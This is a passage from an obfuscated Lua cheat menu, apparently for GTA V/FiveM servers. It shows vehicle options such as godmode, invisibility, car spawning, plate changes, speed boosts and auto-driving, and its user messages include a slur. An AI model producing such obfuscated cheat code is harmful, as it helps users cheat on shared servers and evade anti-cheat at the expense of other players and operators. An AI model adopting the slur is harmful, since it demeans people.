                                            nlFXKkFxuKQAk.natives.SetVehicleNeonLightEnabled(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 1, false)
                                            nlFXKkFxuKQAk.natives.SetVehicleNeonLightEnabled(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 2, false)
                                            nlFXKkFxuKQAk.natives.SetVehicleNeonLightEnabled(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 3, false)
                                        end
                                    end                                    
                                    if jrnyLearIyzKiSIen.config.features.UnderGC then
                                        if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Neon Colors', REVMYmrswsZvxOXvJE.UnderGC.items, REVMYmrswsZvxOXvJE.UnderGC.currentItemIndex, REVMYmrswsZvxOXvJE.UnderGC.selectedItemIndex, function(currentIndex, selectedIndex)
                                            REVMYmrswsZvxOXvJE.UnderGC.currentItemIndex = currentIndex 
                                            REVMYmrswsZvxOXvJE.UnderGC.selectedItemIndex = selectedIndex
                                        end, 3, 90) then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')
                                            local r,g,b = RfPsUKHSFWJuBEJuz.rE.LumTable.LumUnPack(REVMYmrswsZvxOXvJE.UnderGC.values[REVMYmrswsZvxOXvJE.UnderGC.selectedItemIndex])
                                            nlFXKkFxuKQAk.natives.SetVehicleNeonLightsColour(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), r, g, b)
                                        end
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil 
                                end

                            elseif curvopt1 == 'Tints' then
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('None', 3, 50) then
                                    nlFXKkFxuKQAk.natives.SetVehicleWindowTint(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 4)
                                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Stock', 3, 70) then
                                    nlFXKkFxuKQAk.natives.SetVehicleWindowTint(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 0)
                                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Light Smoke', 3, 90) then
                                    nlFXKkFxuKQAk.natives.SetVehicleWindowTint(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 3)
                                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Dark Smoke', 3, 110) then
                                    nlFXKkFxuKQAk.natives.SetVehicleWindowTint(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 2)
                                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Limo', 3, 130) then
                                    nlFXKkFxuKQAk.natives.SetVehicleWindowTint(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 1)
                                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Green', 3, 150) then
                                    nlFXKkFxuKQAk.natives.SetVehicleWindowTint(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 5)
                                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil 
                                end
                            else
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil 
                                end
                            end
                        else
                            jrnyLearIyzKiSIen.func.DrawSomeText('Get In A Car Retard!', 4, false, jrnyLearIyzKiSIen.config.MainX + 17, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men3Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs3 + 40, jrnyLearIyzKiSIen.config.PointerScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                        end
                    else
                        if nlFXKkFxuKQAk.natives.IsPedInAnyVehicle(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false) then

                            local vprop = jrnyLearIyzKiSIen.func.VehProperties(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false))

                            if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Armor', REVMYmrswsZvxOXvJE.ArmUp.items, REVMYmrswsZvxOXvJE.ArmUp.currentItemIndex, REVMYmrswsZvxOXvJE.ArmUp.selectedItemIndex, function(currentIndex, selectedIndex)
                                REVMYmrswsZvxOXvJE.ArmUp.currentItemIndex = currentIndex
                                REVMYmrswsZvxOXvJE.ArmUp.selectedItemIndex = selectedIndex
                            end, 3, 52.5) then
                                nlFXKkFxuKQAk.natives.SetVehicleModKit(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 0)
                                nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 16, nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 16) - REVMYmrswsZvxOXvJE.ArmUp.values[REVMYmrswsZvxOXvJE.ArmUp.selectedItemIndex], false)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')
                            end

                            if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Engine', REVMYmrswsZvxOXvJE.EngUp.items, REVMYmrswsZvxOXvJE.EngUp.currentItemIndex, REVMYmrswsZvxOXvJE.EngUp.selectedItemIndex, function(currentIndex, selectedIndex)
                                REVMYmrswsZvxOXvJE.EngUp.currentItemIndex = currentIndex
                                REVMYmrswsZvxOXvJE.EngUp.selectedItemIndex = selectedIndex
                            end, 3, 72.5) then
                                nlFXKkFxuKQAk.natives.SetVehicleModKit(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 0)
                                nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 11, nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 11) - REVMYmrswsZvxOXvJE.EngUp.values[REVMYmrswsZvxOXvJE.EngUp.selectedItemIndex], false)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')
                            end

                            if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Transmission', REVMYmrswsZvxOXvJE.TransUp.items, REVMYmrswsZvxOXvJE.TransUp.currentItemIndex, REVMYmrswsZvxOXvJE.TransUp.selectedItemIndex, function(currentIndex, selectedIndex)
                                REVMYmrswsZvxOXvJE.TransUp.currentItemIndex = currentIndex 
                                REVMYmrswsZvxOXvJE.TransUp.selectedItemIndex = selectedIndex
                            end, 3, 92.5) then
                                nlFXKkFxuKQAk.natives.SetVehicleModKit(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 0) 
                                nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 13, nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 13) - REVMYmrswsZvxOXvJE.TransUp.values[REVMYmrswsZvxOXvJE.TransUp.selectedItemIndex], false)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')
                            end

                            if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Brakes', REVMYmrswsZvxOXvJE.BrakeUp.items, REVMYmrswsZvxOXvJE.BrakeUp.currentItemIndex, REVMYmrswsZvxOXvJE.BrakeUp.selectedItemIndex, function(currentIndex, selectedIndex)
                                REVMYmrswsZvxOXvJE.BrakeUp.currentItemIndex = currentIndex 
                                REVMYmrswsZvxOXvJE.BrakeUp.selectedItemIndex = selectedIndex
                            end, 3, 112.5) then
                                nlFXKkFxuKQAk.natives.SetVehicleModKit(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 0) 
                                nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 12, nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 12) - REVMYmrswsZvxOXvJE.BrakeUp.values[REVMYmrswsZvxOXvJE.BrakeUp.selectedItemIndex], false)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')
                            end

                            if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Suspension', REVMYmrswsZvxOXvJE.SusUp.items, REVMYmrswsZvxOXvJE.SusUp.currentItemIndex, REVMYmrswsZvxOXvJE.SusUp.selectedItemIndex, function(currentIndex, selectedIndex)
                                REVMYmrswsZvxOXvJE.SusUp.currentItemIndex = currentIndex
                                REVMYmrswsZvxOXvJE.SusUp.selectedItemIndex = selectedIndex
                            end, 3, 132.5) then
                                nlFXKkFxuKQAk.natives.SetVehicleModKit(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 0) 
                                nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 15, nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 15) - REVMYmrswsZvxOXvJE.SusUp.values[REVMYmrswsZvxOXvJE.SusUp.selectedItemIndex], false)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')
                            end

                            if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Turbo Tuning', vprop['modTurbo'], function(enabled) vprop['modTurbo'] = enabled end, 3, 152.5) then
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!') 
                                if vprop['modTurbo'] then
                                    nlFXKkFxuKQAk.natives.ToggleVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 18, true)
                                else
                                    nlFXKkFxuKQAk.natives.ToggleVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 18, false)
                                end
                            end

                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('MAX OUT', 3, 30, 100) then 
                                nlFXKkFxuKQAk.natives.SetVehicleModKit(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 0)
                                nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 11, nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 11) - 1, false)
                                nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 13, nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 13) - 1, false)
                                nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 12, nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 12) - 1, false)
                                nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 15, nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 15) - 1, false)
                                nlFXKkFxuKQAk.natives.ToggleVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 18, true)
                            end

                        else
                            jrnyLearIyzKiSIen.func.DrawSomeText('Get In A Car Retard', 4, false, jrnyLearIyzKiSIen.config.MainX + 17, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men3Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs3 + 40, jrnyLearIyzKiSIen.config.PointerScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                        end
                    end
                
                elseif REVMYmrswsZvxOXvJE.Mopt.values[REVMYmrswsZvxOXvJE.Mopt.selectedItemIndex] == 1 then
                    if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Quick Options', REVMYmrswsZvxOXvJE.VQopt.items, REVMYmrswsZvxOXvJE.VQopt.currentItemIndex, REVMYmrswsZvxOXvJE.VQopt.selectedItemIndex, function(currentIndex, selectedIndex)
                        REVMYmrswsZvxOXvJE.VQopt.currentItemIndex = currentIndex 
                        REVMYmrswsZvxOXvJE.VQopt.selectedItemIndex = selectedIndex
                    end, 3, 30) then 
                        REVMYmrswsZvxOXvJE.VQopt.values[REVMYmrswsZvxOXvJE.VQopt.selectedItemIndex](nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false)) if REVMYmrswsZvxOXvJE.VQopt.items[REVMYmrswsZvxOXvJE.VQopt.selectedItemIndex] == 'Repair' then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have Succesfuly ~g~Repaired ~w~Your Vehicle') elseif REVMYmrswsZvxOXvJE.VQopt.items[REVMYmrswsZvxOXvJE.VQopt.selectedItemIndex] == 'Repair Engine' then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification("You Have Succesfuly ~g~Repaired ~w~Your Vehicle's Engine") elseif REVMYmrswsZvxOXvJE.VQopt.items[REVMYmrswsZvxOXvJE.VQopt.selectedItemIndex] == 'Clean' then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have Succesfuly ~g~Cleaned ~w~Your Vehicle') elseif REVMYmrswsZvxOXvJE.VQopt.items[REVMYmrswsZvxOXvJE.VQopt.selectedItemIndex] == 'Flip' then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have Succesfuly ~g~Fliped ~w~Your Vehicle') elseif REVMYmrswsZvxOXvJE.VQopt.items[REVMYmrswsZvxOXvJE.VQopt.selectedItemIndex] == 'Delete' then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have Succesfuly ~g~Deleted ~w~Your Vehicle') end
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Boost Modifier', REVMYmrswsZvxOXvJE.Bopt.items, REVMYmrswsZvxOXvJE.Bopt.currentItemIndex, REVMYmrswsZvxOXvJE.Bopt.selectedItemIndex, function(currentIndex, selectedIndex)
                        REVMYmrswsZvxOXvJE.Bopt.currentItemIndex = currentIndex 
                        REVMYmrswsZvxOXvJE.Bopt.selectedItemIndex = selectedIndex
                        nlFXKkFxuKQAk.natives.ModifyVehicleTopSpeed(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), REVMYmrswsZvxOXvJE.Bopt.values[REVMYmrswsZvxOXvJE.Bopt.selectedItemIndex])
                    end, 3, 50) then end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Spawn A Car', 3, 70) then
                        local ModelName = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput("Enter Vehicle Spawn Name", "", 100)
                        if nlFXKkFxuKQAk.natives.IsModelValid(ModelName) then
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have Succesfuly Spawned: '.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(ModelName) ..'')
                            DmSgpcIoUEJtyTfBBt.FunFunc.spawnvehicle(ModelName)
                        else
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('ERROR: ~r~'.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(ModelName) ..' ~w~Is Not A Vehicle!')
                        end
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Custom Car Finder', 3, 90) then
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Check Console For ~g~Cars')
                        RfPsUKHSFWJuBEJuz.rE.pront("----------- Car Finder -----------")
                        for k, v in RfPsUKHSFWJuBEJuz.rE.Lumpairs(jrnyLearIyzKiSIen.func.CustomVs) do
                            if nlFXKkFxuKQAk.natives.IsModelValid(v.spawn) then
                                RfPsUKHSFWJuBEJuz.rE.pront('Name: '..v.name..'', 'Spawn: '..v.spawn..'')
                            end
                        end
                        RfPsUKHSFWJuBEJuz.rE.pront('----------------------------------')
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Change Plate Text', 3, 110) then
                        local plateText = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput("Enter new plate text", "", 8)
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Succesfuly ~w~Set The Plate Text Too: '.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(plateText) ..'')
                        DmSgpcIoUEJtyTfBBt.FunFunc.Swapdaplate(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), plateText)
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Vehicle Godmode', jrnyLearIyzKiSIen.config.features.vehicularjesus, function(enabled) jrnyLearIyzKiSIen.config.features.vehicularjesus = enabled end, 3, 130) then 
                        if jrnyLearIyzKiSIen.config.features.vehicularjesus then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Vehicle Godmode ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Vehicle Godmode ~r~OFF') end
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Motorcyle Seatbelt', jrnyLearIyzKiSIen.config.features.vehicularseatbelt, function(enabled) jrnyLearIyzKiSIen.config.features.vehicularseatbelt = enabled end, 3, 150) then
                        if jrnyLearIyzKiSIen.config.features.vehicularseatbelt then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Motorcyle Seatbelt ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Motorcyle Seatbelt ~r~OFF') end
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Make Vehicle Invisible', jrnyLearIyzKiSIen.config.features.vehicularnosee, function(enabled) jrnyLearIyzKiSIen.config.features.vehicularnosee = enabled end, 3, 170) then 
                        if jrnyLearIyzKiSIen.config.features.vehicularnosee then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Vehicle Invisibility ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Vehicle Invisibility ~r~OFF') end
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Under Water Car', jrnyLearIyzKiSIen.config.features.UnderWaterCar, function(enabled) jrnyLearIyzKiSIen.config.features.UnderWaterCar = enabled end, 3, 190) then 
                        if jrnyLearIyzKiSIen.config.features.UnderWaterCar then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Under Water Car ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Under Water Car ~r~OFF') end
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Kewl Plate Man', jrnyLearIyzKiSIen.config.features.kewlplaterino, function(enabled) jrnyLearIyzKiSIen.config.features.kewlplaterino = enabled end, 3, 210) then if jrnyLearIyzKiSIen.config.features.kewlplaterino then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Kewl Plate ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Kewl Plate ~r~OFF') end RfPsUKHSFWJuBEJuz.rE.LumThread(function() while jrnyLearIyzKiSIen.config.features.kewlplaterino do nlFXKkFxuKQAk.natives.SetVehicleNumberPlateText(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), "LUMIA MEN") RfPsUKHSFWJuBEJuz.rE.LumWait(200) nlFXKkFxuKQAk.natives.SetVehicleNumberPlateText(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), "UMIA MENU") RfPsUKHSFWJuBEJuz.rE.LumWait(200) nlFXKkFxuKQAk.natives.SetVehicleNumberPlateText(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), "MIA MENU ") RfPsUKHSFWJuBEJuz.rE.LumWait(200) nlFXKkFxuKQAk.natives.SetVehicleNumberPlateText(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), "IA MENU L") RfPsUKHSFWJuBEJuz.rE.LumWait(200) nlFXKkFxuKQAk.natives.SetVehicleNumberPlateText(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), "A MENU LU") RfPsUKHSFWJuBEJuz.rE.LumWait(200) nlFXKkFxuKQAk.natives.SetVehicleNumberPlateText(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), " MENU LUM") RfPsUKHSFWJuBEJuz.rE.LumWait(200) nlFXKkFxuKQAk.natives.SetVehicleNumberPlateText(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), "MENU LUMI") RfPsUKHSFWJuBEJuz.rE.LumWait(200) nlFXKkFxuKQAk.natives.SetVehicleNumberPlateText(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), "ENU LUMIA") RfPsUKHSFWJuBEJuz.rE.LumWait(200) nlFXKkFxuKQAk.natives.SetVehicleNumberPlateText(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), "NU LUMIA ") RfPsUKHSFWJuBEJuz.rE.LumWait(200) nlFXKkFxuKQAk.natives.SetVehicleNumberPlateText(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), "U LUMIA M") RfPsUKHSFWJuBEJuz.rE.LumWait(200) nlFXKkFxuKQAk.natives.SetVehicleNumberPlateText(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), " LUMIA ME") RfPsUKHSFWJuBEJuz.rE.LumWait(200) end end) end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('EZ Handeling', jrnyLearIyzKiSIen.config.features.ezdrove, function(enabled) jrnyLearIyzKiSIen.config.features.ezdrove = enabled end, 3, 230) then 
                        if jrnyLearIyzKiSIen.config.features.ezdrove then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('EZ Handeling ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('EZ Handeling ~r~OFF') end
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Speed Boosters Man', jrnyLearIyzKiSIen.config.features.SpedBoostman, function(enabled) jrnyLearIyzKiSIen.config.features.SpedBoostman = enabled end, 3, 250) then 
                        if jrnyLearIyzKiSIen.config.features.SpedBoostman then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Speed Boosters ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Speed Boosters ~r~OFF') end
                    end
                elseif REVMYmrswsZvxOXvJE.Mopt.values[REVMYmrswsZvxOXvJE.Mopt.selectedItemIndex] == 3 then
                    if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Driving Style', REVMYmrswsZvxOXvJE.ADStyles.items, REVMYmrswsZvxOXvJE.ADStyles.currentItemIndex, REVMYmrswsZvxOXvJE.ADStyles.selectedItemIndex, function(currentIndex, selectedIndex)
                        REVMYmrswsZvxOXvJE.ADStyles.currentItemIndex = currentIndex 
                        REVMYmrswsZvxOXvJE.ADStyles.selectedItemIndex = selectedIndex
                    end, 3, 30) then end

                    -- Taxi Mode (keep looking for waypoints)
                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Taxi Mode', jrnyLearIyzKiSIen.config.features.Taxi, function(enabled) jrnyLearIyzKiSIen.config.features.Taxi = enabled end, 3, 50) then 
                        RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                            local hasTask = false
                            while jrnyLearIyzKiSIen.config.features.Taxi do
                                local getMyV = nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.PlayerPedId(), false);
                                local getMyWp = nlFXKkFxuKQAk.natives.GetFirstBlipInfoId(8);
                                local isWp = nlFXKkFxuKQAk.natives.DoesBlipExist(getMyWp);
                                local isDriver = nlFXKkFxuKQAk.natives.GetPedInVehicleSeat(getMyV, -1);
                                local wpCoords = nlFXKkFxuKQAk.natives.GetBlipInfoIdCoord(getMyWp)
                                local haveIArived = nlFXKkFxuKQAk.natives.GetIsTaskActive(nlFXKkFxuKQAk.natives.PlayerPedId(), 159)
                                if getMyV ~= 0 and isDriver == nlFXKkFxuKQAk.natives.PlayerPedId() then
                                    if not hasTask and isWp then
                                        nlFXKkFxuKQAk.natives.TaskVehicleDriveToCoordLongrange(nlFXKkFxuKQAk.natives.PlayerPedId(), getMyV, wpCoords["x"], wpCoords["y"], wpCoords["z"], 200.0, REVMYmrswsZvxOXvJE.ADStyles.values[REVMYmrswsZvxOXvJE.ADStyles.selectedItemIndex], 10.0)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Driving To The New Waypoint')
                                        hasTask = true
                                    else
                                        if haveIArived == 1 then
                                            nlFXKkFxuKQAk.natives.SetVehicleForwardSpeed(nlFXKkFxuKQAk.natives.GetVehiclePedIsUsing(nlFXKkFxuKQAk.natives.PlayerPedId()), 0.0)
                                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Please Set A New Waypoint')
                                            RfPsUKHSFWJuBEJuz.rE.LumWait(5000)
                                            if isWp then
                                                hasTask = false
                                            end
                                        end
                                    end
                                end
                                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                            end
                        end)
                    end

                    -- Drive To Waypoint
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Drive To Waypoint', 3, 70) then
                        RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                            local getMyV = nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.PlayerPedId(), false);
                            local getMyWp = nlFXKkFxuKQAk.natives.GetFirstBlipInfoId(8);
                            local isWp = nlFXKkFxuKQAk.natives.DoesBlipExist(getMyWp);
                            local isDriver = nlFXKkFxuKQAk.natives.GetPedInVehicleSeat(getMyV, -1);
                            if getMyV ~= 0 and isWp and isDriver == nlFXKkFxuKQAk.natives.PlayerPedId() then
                                local wpCoords = nlFXKkFxuKQAk.natives.GetBlipInfoIdCoord(getMyWp)
